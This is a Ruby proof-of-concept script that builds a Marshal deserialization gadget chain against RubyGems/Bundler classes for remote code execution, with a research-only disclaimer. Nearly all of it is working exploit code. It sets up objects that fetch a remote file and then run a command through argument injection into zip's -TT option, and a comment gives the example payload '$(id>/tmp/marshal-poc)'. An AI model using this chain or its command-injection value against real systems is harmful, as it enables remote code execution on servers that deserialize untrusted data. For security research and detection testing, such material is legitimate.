# Disclaimer:
# This software has been created purely for the purposes of academic research and for the development of effective defensive techniques, 
# and is not intended to be used to attack systems except where explicitly authorized.
# Project maintainers are not responsible or liable for misuse of the software. Use responsibly.

# This Ruby marshall unsafe deserialization proof of concept is originally based on: https://devcraft.io/2022/04/04/universal-deserialisation-gadget-for-ruby-2-x-3-x.html
# It was observed to work up to Ruby 3.2.4

Gem::SpecFetcher # Autoload 


def call_url_and_create_folder(url) # provided url should not have a query (?) component
  uri = URI::HTTP.allocate
  uri.instance_variable_set("@path", "/")
  uri.instance_variable_set("@scheme", "s3")
  uri.instance_variable_set("@host", url + "?")  # use the https host+path with your rz file
  uri.instance_variable_set("@port", "/../../../../../../../../../../../../../../../tmp/cache/bundler/git/any-c5fe0200d1c7a5139bd18fd22268c4ca8bf45e90/") # c5fe... is the SHA-1 of "any"
  uri.instance_variable_set("@user", "any")
  uri.instance_variable_set("@password", "any")

  source = Gem::Source.allocate
  source.instance_variable_set("@uri", uri)
  source.instance_variable_set("@update_cache", true)

  index_spec = Gem::Resolver::IndexSpecification.allocate
  index_spec.instance_variable_set("@name", "name")
  index_spec.instance_variable_set("@source", source)

  request_set = Gem::RequestSet.allocate
  request_set.instance_variable_set("@sorted_requests", [index_spec])

  lockfile = Gem::RequestSet::Lockfile.allocate
  lockfile.instance_variable_set("@set", request_set)
  lockfile.instance_variable_set("@dependencies", [])

  return lockfile
end

def git_gadget(executable, second_param)
  git_source = Gem::Source::Git.allocate
  git_source.instance_variable_set("@git", executable)
  git_source.instance_variable_set("@reference", second_param)
  git_source.instance_variable_set("@root_dir", "/tmp")
  git_source.instance_variable_set("@repository", "any")
  git_source.instance_variable_set("@name", "any")

  spec = Gem::Resolver::Specification.allocate
  spec.instance_variable_set("@name", "any")
  spec.instance_variable_set("@dependencies",[])

  git_spec = Gem::Resolver::GitSpecification.allocate
  git_spec.instance_variable_set("@source", git_source)
  git_spec.instance_variable_set("@spec", spec)

  spec_specification = Gem::Resolver::SpecSpecification.allocate
  spec_specification.instance_variable_set("@spec", git_spec)

  return spec_specification
end

def command_gadget(zip_param_to_execute)
  git_gadget_create_zip = git_gadget("zip", "/etc/passwd")
  git_gadget_execute_cmd = git_gadget("zip", zip_param_to_execute)

  request_set = Gem::RequestSet.allocate
  request_set.instance_variable_set("@sorted_requests", [git_gadget_create_zip, git_gadget_execute_cmd])

  lockfile = Gem::RequestSet::Lockfile.allocate
  lockfile.instance_variable_set("@set", request_set)
  lockfile.instance_variable_set("@dependencies",[])

  return lockfile
end

def to_s_wrapper(inner)
  spec = Gem::Specification.new
  spec.instance_variable_set("@new_platform", inner)
  return spec
end

def create_rce_gadget_chain(rz_url_to_load, zip_param_to_execute)
  create_folder_gadget = call_url_and_create_folder(rz_url_to_load)
  exec_gadget = command_gadget(zip_param_to_execute)

  return Marshal.dump([Gem::SpecFetcher, to_s_wrapper(create_folder_gadget), to_s_wrapper(exec_gadget)])
end

# replace with parameter that is provided to the zip executable and can contain a command passed to the -TT param (unzip command), for example: "-TmTT=\"$(id>/tmp/marshal-poc)\"any.zip"
#For example: zip_param_to_execute = "-TmTT=\"$(id>/tmp/marshal-poc)\"any.zip"
zip_param_to_execute = "{ZIP_PARAM}"
rce_gadget_chain = create_rce_gadget_chain("rubygems.org/quick/Marshal.4.8/bundler-2.2.27.gemspec.rz", zip_param_to_execute)

puts rce_gadget_chain.unpack("H*")

#Marshal.load(rce_gadget_chain) # caution: will trigger the detection gadget when uncommented.
